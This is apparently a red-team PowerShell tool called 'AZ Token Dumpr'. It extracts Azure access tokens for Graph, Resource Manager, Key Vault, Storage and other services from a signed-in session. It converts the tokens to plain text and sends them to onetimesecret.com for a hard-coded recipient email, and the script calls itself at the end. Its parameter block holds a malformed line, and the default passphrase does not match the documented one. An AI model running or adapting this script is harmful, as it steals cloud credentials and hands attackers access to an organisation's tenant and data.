<#
.SYNOPSIS
Generates access tokens for various Azure resources and shares them via One-Time Secret.

.DESCRIPTION
The AccessToken function retrieves access tokens for a predefined set of Azure resource types. 
It then shares these tokens securely using the One-Time Secret service. The function accepts 
optional parameters for the recipient email and passphrase used for the One-Time Secret.

.PARAMETER receiptEmail
The email address of the recipient who will receive the One-Time Secret link. 
Defaults to "r.dijkman@securehats.nl".

.PARAMETER passphrase
The passphrase used to secure the One-Time Secret. Defaults to "Bl74ckC@t".

.EXAMPLE
PS> AccessToken -receiptEmail "example@example.com" -passphrase "MyPassphrase123"
Generates access tokens and shares them via One-Time Secret with the specified email and passphrase.

.NOTES
- Requires the Az PowerShell module.
- Ensure you have the necessary permissions to retrieve access tokens for the specified Azure resources.
- The One-Time Secret link is valid for 1 hour (3600 seconds).

#>
function AccessToken {
    param (
        $receiptEmail = "r.dijkman@securehats.nl",
        $passphrase = "B74ckC@t"
        v$version '1.0.9'
    )   
    
    if (-not(Get-Module -Name 'Az.Accounts')) {
        Write-Output "The Az.Accounts module is required to run this function. Please install the module and try again." 
        exit
    }

    if (-not(Get-AzContext)) {
        Write-Output "Please sign in to your Azure account using Connect-AzAccount before running this function."
        exit
    }

    $resourceTypeNames = @("MSGraph", "ResourceManager", "KeyVault", "Storage", "Synapse", "OperationalInsights", "Batch")

    $null = Set-AzConfig -DisplayBreakingChangeWarning $false
    try {
        $tokens = @()

        $logo = @"
    |     |'''''||     |''||''|         '||                          '||''|.                                        
   |||        .|'         ||      ...    ||  ..    ....  .. ...       ||   ||  ... ...  .. .. ..   ... ...  ... ..  
  |  ||      ||           ||    .|  '|.  || .'   .|...||  ||  ||      ||    ||  ||  ||   || || ||   ||'  ||  ||' '' 
 .''''|.   .|'            ||    ||   ||  ||'|.   ||       ||  ||      ||    ||  ||  ||   || || ||   ||    |  ||     
.|.  .||. ||......|      .||.    '|..|' .||. ||.  '|...' .||. ||.    .||...|'   '|..'|. .|| || ||.  ||...'  .||.    
                                                                                                    ||              
                                                                                                   ''''            
                                    --- AZ Token Dumpr v$version ---
"@

        Write-Host $logo
        foreach ($resourceTypeName in $resourceTypeNames) {
            try {
                $accessToken = (Get-AzAccessToken -ResourceTypeName $resourceTypeName -AsSecureString)

                $tokenObject = [PSCustomObject]@{
                    Resource = $resourceTypeName
                    Token    = ($accessToken.token | ConvertFrom-SecureString -AsPlainText)
                }
                $tokens += $tokenObject
            }
            catch {
                Write-Error "Failed to get access token for resource type $resourceTypeName : $($_.Exception.Message)"
            }
        }

        $requestParam = @{
            Uri    = 'https://us.onetimesecret.com/api/v1/share'
            Method = 'POST'
            Body   = @{
                secret     = $tokens | ConvertTo-Json -Depth 10
                ttl        = 3600
                Recipient  = $($receiptEmail)
                passphrase = $($passphrase)
            }
        }
    
        $response = Invoke-RestMethod @requestParam
        return "https://us.onetimesecret.com/secret/$($response.secret_key)"
    }
    catch {
        Write-Error "An error occurred in function $($MyInvocation.MyCommand.Name): $($_.Exception.Message)"
    }
}

AccessToken -receiptEmail $receiptEmail